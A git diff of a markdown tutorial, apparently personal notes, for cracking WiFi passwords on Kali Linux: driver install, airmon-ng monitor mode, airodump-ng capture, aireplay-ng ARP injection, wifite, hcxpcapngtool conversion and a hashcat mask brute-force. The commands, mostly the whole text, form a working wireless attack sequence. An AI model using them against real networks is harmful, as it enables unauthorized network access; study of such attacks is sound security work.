@@ -5,15 +5,17 @@ tools that I used : ALFA AC1200 AWUS036ACH
 
 ## First Step : install driver on Kali Linux
 
-`apt-get update
-`apt-get upgrade -y
-`apt-get dist-upgrade -y
-`apt-get install dkms`
-`apt-get install realtek-rtl88xxau-dkms
-`git clone https://github.com/aircrack-ng/rtl8812au.git`
-`cd rtl8812au   
-`make  
-`make install
+```
+apt-get update
+apt-get upgrade -y
+apt-get dist-upgrade -y
+apt-get install dkms`
+apt-get install realtek-rtl88xxau-dkms
+git clone https://github.com/aircrack-ng/rtl8812au.git`
+cd rtl8812au   
+make  
+make install
+```
 
 lastly, you need to reboot your Kali Linux
 
@@ -23,7 +25,7 @@ Prior to looking for networks, you must put your wireless card into what is call
 
 To put your wireless card into monitor mode using airmon-ng:
 
-`airmon-ng start wlan0
+`airmon-ng start wlan0`
 
 To confirm it is in monitor mode, run "iwconfig" and confirm the mode.
 
@@ -71,11 +73,14 @@ With the -c parameter you tune to a channel and the parameter after -w is the pr
 
 First open a window with an airodump-ng sniffing for traffic. aireplay-ng and airodump-ng can run together. Wait for a client to show up on the target network. Then start the attack:
 
-`aireplay-ng --arp`
+```
+aireplay-ng --arp
 
-`sudo wifite --no-pmkid`
+sudo wifite --no-pmkid
 
-`sudo airodump-ng --band abg wlan0`
+sudo airodump-ng --band abg wlan0
+
+```
 
 
 
@@ -89,14 +94,16 @@ if you've got enough IVs captured in one or more file, you can try to crack the 
 ## HashCat 
 
 
-`sudo apt install hcxtools
+```
+sudo apt install hcxtools
 
-`hcxpcapngtool -o hashcat_format dump-01.cap
+hcxpcapngtool -o hashcat_format dump-01.cap
 
+```
 transfer the hashcat_format to your machine (create a shared directory)
 
-`install the hashcat.exe
+install the hashcat.exe
 
 we have received a hashcat netmask ?u?d?l?l?u?l?s?s
 
-on powershell : ``.\hashcat.exe -m 22000 -a 3 . . \hashes\hashcat_format ?u?d?l?l?u?l?s?s  . . \hashes\optimized.txt
+on powershell : `.\hashcat.exe -m 22000 -a 3 . . \hashes\hashcat_format ?u?d?l?l?u?l?s?s  . . \hashes\optimized.txt `
